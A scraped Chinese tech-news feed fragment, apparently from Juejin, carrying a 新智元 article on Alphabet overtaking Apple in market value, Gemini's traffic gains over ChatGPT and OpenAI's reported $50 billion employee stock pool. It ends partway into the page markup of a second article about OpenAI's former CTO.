content="2026-01-08T10:18:21.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="新智元"/> <meta itemprop="url" content="https://juejin.cn/user/952600743642312"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            全球第二易主，谷歌逆袭登顶！OpenAI 500 亿股票池曝光，Ilya 躺赚 40 亿
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/952600743642312/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    新智元
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T10:18:21.000Z" title="Thu Jan 08 2026 10:18:21 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/98e1b301752e435c9a8310affc063492~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768472301&amp;x-signature=f7VEYydlQhHqD3HvJCFGs%2F5gKU0%3D" alt="" loading="lazy"/></p>
<h5 data-id="heading-0"><strong>「【新智元导读】刚刚，谷歌母公司成为全球市值 TOP 2，市值已达 3.885 万亿美元！在 2026 首个全球 AI 追踪报告中，Gemini 的市场份额也在疯涨。被逼急的 OpenAI，干脆甩出 500 亿美元的员工股票池，据说 Ilya 就分走了 40 亿。」</strong></h5>
<p>今天，谷歌是捷报频传！</p>
<p>就在刚刚，谷歌母公司 Alphabet 的市值超过苹果，成为全球市值第二高的公司。</p>
<p>Alphabet 当前市值约为 3.885 万亿美元，略高于苹果的 3.846 万亿美元。而英伟达依然以 4.595 万亿美元的市值遥遥领先，稳居全球第一。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c6a23cd3576c43c091fe172b1969a109~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768472301&amp;x-signature=t8QQvWZgw%2FjVmD4KUDDqWofYQ5o%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/29658ea75f2f4b789002132d2e958e93~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768472301&amp;x-signature=5Sk74vGbYE7TrybNkRS4P37o4UE%3D" alt="" loading="lazy"/></p>
<p>不仅如此，就在刚刚发布的 2026 年首个全球人工智能追踪报告中，Gemini 的势头凶猛，ChatGPT 则开始狂跌。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ad1abd4985a343f681de0c4cfee14f9b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768472301&amp;x-signature=0S1OMwT2rTBqq4RFEuhgzMHoALc%3D" alt="" loading="lazy"/></p>
<p>可以看出，从 12 个月前到现在，各家 AI 产品的攻守之势开始转换。Gemini 的的市场份额已经超过了 20%，而 ChatGPT 则跌破了 65% 大关。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f8fbfd0ba0f040cb82583134d4f722db~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768472301&amp;x-signature=QUYLqViAnpRFWYw3KukHymVTHh8%3D" alt="" loading="lazy"/></p>
<p>外媒纷纷发文点赞谷歌：它已经逆转颓势，把 OpenAI 踩在脚下了！</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/605992587cc54cafb85f9cfbbb956876~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768472301&amp;x-signature=fuw59CmdFvd927fcYcZdYnqSDwE%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c90fe213e3c444fc8e685449f487399f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768472301&amp;x-signature=%2FcuS0JP0S7R1xtf4QQchF6wajII%3D" alt="" loading="lazy"/></p>
<p><strong>「市值反超苹果」</strong></p>
<p><strong>「谷歌重夺全球第二」</strong></p>
<p>可以说，谷歌市值重回全球第二，这是它应得的。</p>
<p>自去年夏末以来，谷歌的股价就一直在持续走高。</p>
<p>当时，一名联邦法官裁定谷歌在搜索业务中构成非法垄断后，仅施加了相对较轻的处罚。这一结果，就大大缓解了市场的担忧情绪。</p>
<p>而最近谷歌在 AI 领域的勇猛表现，证明它已经彻底追赶上 OpenAI，让投资人信心大增。</p>
<p>2025 年，谷歌股价累计上涨了 65%，成为大型科技股中表现最好的公司；今年以来，它股价又继续上涨了 2.9%。</p>
<p>相比之下，苹果股价表现明显逊色。2025 年全年仅上涨 8.6%，而今年以来则已下跌 4%。</p>
<p>这也是资本市场在用真金白银投票：在 AI 定义的未来，谷歌显然比苹果更具想象力。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/211c175f73cd46ed9d1ac99e0a74b26e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768472301&amp;x-signature=OaNJo4oMXciqjaW3D%2Bb5CEG4QG8%3D" alt="" loading="lazy"/></p>
<p>谷歌联创谢尔盖 · 布林（右）在年度开发者大会上与 DeepMind 部门负责人 Hassabis 交谈</p>
<p><strong>「<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e7daac66ae5c4d50b6915f41c66554e5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768472301&amp;x-signature=s3xksfy%2F20JNFluniKr8JL2j1qY%3D" alt="" loading="lazy"/>」</strong></p>
<p><strong>「一张流量图，让 OpenAI 拉响警报」</strong></p>
<p>如开头所言，Similarweb 的这张流量对比图，揭示了一个让 OpenAI 极其危险的信号——AI 竞赛的风向，变了！</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/28a6dd9eca7744279297ec14cf108f19~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768472301&amp;x-signature=3gTqKoKDJuFu4B7lmwkcds2GDpo%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/26ace172e9494da8a01aa3eda1c81524~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768472301&amp;x-signature=bc5U8UIhE65KZSilFr8%2FHMqpa%2Bw%3D" alt="" loading="lazy"/></p>
<p>自**「去年 11 月谷歌发布 Gemini 3 Pro」** 以来：<strong>「ChatGPT 网站</strong>「<strong>「流量」</strong>」<strong>骤降，Gemini 的网站流量则快速上升。」</strong></p>
<p>去年 12 月，Gemini 的流量**「环比****增长 28.4%，**「ChatGPT 的流量则」<strong>环比下降 5.6%。」</strong></p>
<p>Menlo Ventures 合伙人 <strong>「Deedy Das」</strong> 指出这组数据后，引发了科技圈的广泛讨论。</p>
<p><strong>「显然，用户注意力，正在发生边际转移。」</strong></p>
<p>虽然根据 Similar Web 的数据，12 月各大 AI 网站的访问量中，ChatGPT 仍然稳居第一，但真正值得警惕的却是增长率差异。</p>
<p>从增速上来看，ChatGPT 为 49.5%，Gemini 却达到了疯狂的 563.6%！</p>
<p>这就意味着，Gemini 正在经历一个典型的「追赶爆发期」，而 ChatGPT 的增速已经在放缓。</p>
<p>显然，Gemini 3 和 Nano Banana 发布后极高的市场评价，撬动了整个局面。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/43ebe6c62bad45829ad7076198f10b5c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768472301&amp;x-signature=tNkD51B6DsAhVD5hfcoFYzgNJK8%3D" alt="" loading="lazy"/></p>
<p>不过，更让 OpenAI 感到压力的，是谷歌的结构性优势。</p>
<p>谷歌真正的王牌，不是模型，而是入口。它相对 OpenAI 的最大优势，就是几乎所有人都在用谷歌——搜索，浏览器，Android，Workspace，而 Gemini 可以无缝嵌入这些高频场景。</p>
<p>上面这张流量图昭示出：AI 竞赛，已经进入第二阶段。从前比拼的是模型能力，而现在，比的就是入口、产品形态和用户习惯。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/872fe89e02cc4fe9a39b72d4edb75e6d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768472301&amp;x-signature=tGIl7V2Hwh%2BtSFu4Jw29AeuO0zY%3D" alt="" loading="lazy"/></p>
<p><strong>「<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0f5120288c8846ce940d6eb8cb1c05b8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768472301&amp;x-signature=slTZl9T0kMZBVtWmTZe0MXvQbIc%3D" alt="" loading="lazy"/>」</strong></p>
<p><strong>「2025，谷歌成功逆袭」</strong></p>
<p>曾经的 AI 热潮中，保守的谷歌似乎节节败退。</p>
<p>很少有人预料到，谷歌会在 2025 年完成一场漂亮的反击——</p>
<p>用多年积累的科研基础和数十亿利润，不断砸向 AI 研发；谷歌大脑与 DeepMind 两大研究组织合并；Nano Banana 掀起全网热潮；Gemini 3，直接击败 OpenAI 的最强旗舰模型。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9425d8207954427b82cd516c532ddeee~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768472301&amp;x-signature=wcIuj%2BdyMaYFlg5AW2rHxTQy6Do%3D" alt="" loading="lazy"/></p>
<p>全栈整合能力，让谷歌从数据中心、TPU 芯片到产品级生态都全面领先；搜索、浏览、地图、邮件等入口，让它深度连接日常生活场景。</p>
<p>这背后，是谷歌多年沉淀的技术与生态实力，短期内很难被哪个实验室追上。</p>
<p>接下来，就是一场生态、流量与人类注意力的战争。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/42eb29ba6e0940afa192a803ff2d2648~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768472301&amp;x-signature=uXH5Qb7DoNa5qtg1tpwpdR1nXRE%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6c3f1604b23a47e2b869567e0553300b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768472301&amp;x-signature=ZglNFieJUfRIIzlr5EI6b5pcaMc%3D" alt="" loading="lazy"/></p>
<p><strong>「OpenAI 被逼急」</strong></p>
<p><strong>「豪掷 500 亿美元给员工」</strong></p>
<p>眼看着自己就要被落下，OpenAI 最近也是干脆拿出最后一招——砸钱抢人！</p>
<p>外媒 The Information 爆料，<strong>「OpenAI 在去年秋天悄悄预留了一笔高达 500 亿美元的员工股票授予池」</strong>，占公司总股本的 <strong>「10%」</strong>。</p>
<p>按当时 **「5000 亿美元估值」**计算，这是一笔真正意义上的「天价激励」。</p>
<p>500 亿美元，是什么概念？</p>
<p>注意，这笔钱可不是「未来可能值这么多」，而是**「已经按估值算清楚、直接划出来的股票池」**。</p>
<p>形式是受限股票单位（RSU），使用周期约 <strong>「5 年，并且」<strong>随着估值上涨，</strong>「理论上还会继续升值！」</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8d1e2f916d74444291117ffb00872c7f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768472301&amp;x-signature=%2FQwprCksH53yha9JEc2BZw51piU%3D" alt="" loading="lazy"/></p>
<p>可以说，放在整个科技行业里，这个数字都极不寻常。</p>
<p>比如 Meta 吧，它在 2020 年到 2025 年底，整整五年时间里，<strong>「用于股票薪酬的总支出才是 660 亿美元」</strong>。</p>
<p>然而，Meta 年营收可是 OpenAI 的 15 倍。</p>
<p><strong>「<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8be58e6d04a74ad6b6d811ac3a46dd48~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768472301&amp;x-signature=CNDvO5S2kNXJwUVtrjHdkhB1lRw%3D" alt="" loading="lazy"/>」</strong></p>
<p><strong>「真金白银套现」</strong></p>
<p>你或许认为，这 500 亿美元只是在「画饼」？</p>
<p>更炸裂的来了：截至目前，<strong>「OpenAI 已经向员工发放了约 800 亿美元的已归属股权。」</strong></p>
<p>而且仅仅在**「去年一年」<strong>，员工就出售了</strong>「约 100 亿美元」**的股份！</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/53ea263c8b464567acbbb0aab8e2c3c7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768472301&amp;x-signature=9VVpZ%2FqhZzTXwQjB17Cjt7JfKVg%3D" alt="" loading="lazy"/></p>
<p>注意，这些可是已落袋的真金白银。</p>
<p>对于一家成立只有 10 年的公司，这种体量的员工套现，在整个科技史上，都极为罕见。</p>
<p>去年秋天，OpenAI 完成了一次关键的公司架构重组：将包括**「微软在内的利润分成单位，**「转换为」<strong>传统意义上的股票。」</strong></p>
<p>这次重组完成后，已归属员工股权（约 800 亿美元）和未来员工股票授予池（500 亿美元），<strong>「合计占公司股份的 26%。」</strong></p>
<p>也就是说，<strong>「一次重组之后，员工拿走了 26% 的公司。」</strong></p>
<p><strong>「<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6972c91d963a4a77b279f189f41fa656~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768472301&amp;x-signature=Xvh9utwPBhw7fUVE0fCru7GsSxk%3D" alt="" loading="lazy"/>」</strong></p>
<p><strong>「Ilya 身价曝光：40 亿美金」</strong></p>
<p>而且，这还没完。</p>
<p>目前，OpenAI 正在和投资人谈判新一轮融资，融资规模最高 1000 亿美元。如果交易达成，<strong>「这 500 亿美元的员工股票池，将立刻水涨船高。」</strong></p>
<p>公司内部还预测，到 2030 年，每年的股票薪酬支出会接近 210 亿美元！</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8759c15c76734a0bad527ed879bb15cd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768472301&amp;x-signature=mC1KR342mUwBetQl4qdrxTJJlnk%3D" alt="" loading="lazy"/></p>
<p>为什么必须烧这么多钱？原因就是，人比算力更稀缺。</p>
<p>在通往 AGI 的路上，缺的不是 GPU，而是能设计下一代模型架构、突破 Scaling Law 边界的人。</p>
<p>去年，<strong>「Meta 用「天价薪酬 + 巨额股权」从 OpenAI 和其他公司挖走多名核心研究员」</strong>，仅签约奖金和激励就花了数亿美元。</p>
<p>而 OpenAI 联创、前首席科学家 Ilya 在 2023 年底，就持有大约 40 亿美元的已归属股权。</p>
<p>这个时代，顶级研究员可不仅仅是员工，而是自带估值的资产。</p>
<p>当然，OpenAI 的投资人心头却笼罩着阴影。原因在于，它还在每年烧掉数十亿美元现金。</p>
<p>其实 OpenAI 这套打法，本质上是在赌一件事：<strong>「只要能抢到最顶级的人，稀释、亏损、烧钱，统统都可以先放一边。」</strong></p>
<p>在 AGI 的竞赛里，输掉人才就是提前出局。这场战争不是什么「百万年薪」的问题，起步价，就是 500 亿美元。</p>
<p>参考资料：</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.theinformation.com%2Farticles%2Fopenai-reserves-50-billion-stock-grant-pool%3Frc%3Depv9gi" target="_blank" title="https://www.theinformation.com/articles/openai-reserves-50-billion-stock-grant-pool?rc=epv9gi" ref="nofollow noopener noreferrer">www.theinformation.com/articles/op…</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.theinformation.com%2Fbriefings%2Fgoogle-passes-apple-become-second-valuable-company%3Frc%3Depv9gi" target="_blank" title="https://www.theinformation.com/briefings/google-passes-apple-become-second-valuable-company?rc=epv9gi" ref="nofollow noopener noreferrer">www.theinformation.com/briefings/g…</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fx.com%2FSimilarweb%2Fstatus%2F2008805674893939041" target="_blank" title="https://x.com/Similarweb/status/2008805674893939041" ref="nofollow noopener noreferrer">x.com/Similarweb/…</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.wsj.com%2Ftech%2Fai%2Fgoogle-ai-openai-gemini-chatgpt-b766e160%3Fmod%3Dai_trendingnow_article_pos1" target="_blank" title="https://www.wsj.com/tech/ai/google-ai-openai-gemini-chatgpt-b766e160?mod=ai_trendingnow_article_pos1" ref="nofollow noopener noreferrer">www.wsj.com/tech/ai/goo…</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[1 人顶 1 个 Infra 团队！OpenAI 前 CTO 新招，让大模型训练跌成白菜价]]></title>    <link>https://juejin.cn/post/7592811397505269811</link>    <guid>https://juejin.cn/post/7592811397505269811</guid>    <pubDate>2026-01-08T10:20:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592811397505269811" data-draft-id="7592818272153321499" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="1 人顶 1 个 Infra 团队！OpenAI 前 CTO 新招，让大模型训练跌成白菜价"/> <meta itemprop="keywords" content="人工智能,OpenAI"/> <meta itemprop="datePublished" content="2026-01-08T10:20:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="新智元"/> <meta itemprop="url" content="https://juejin.cn/user/952600743642312"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            1 人顶 1 个 Infra 团队！OpenAI 前 CTO 新招，让大模型训练跌成白菜价
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/952600743642312/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    新智元
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T10:20:15.000Z" title="Thu Jan 08 2026 10:20:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读9分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body 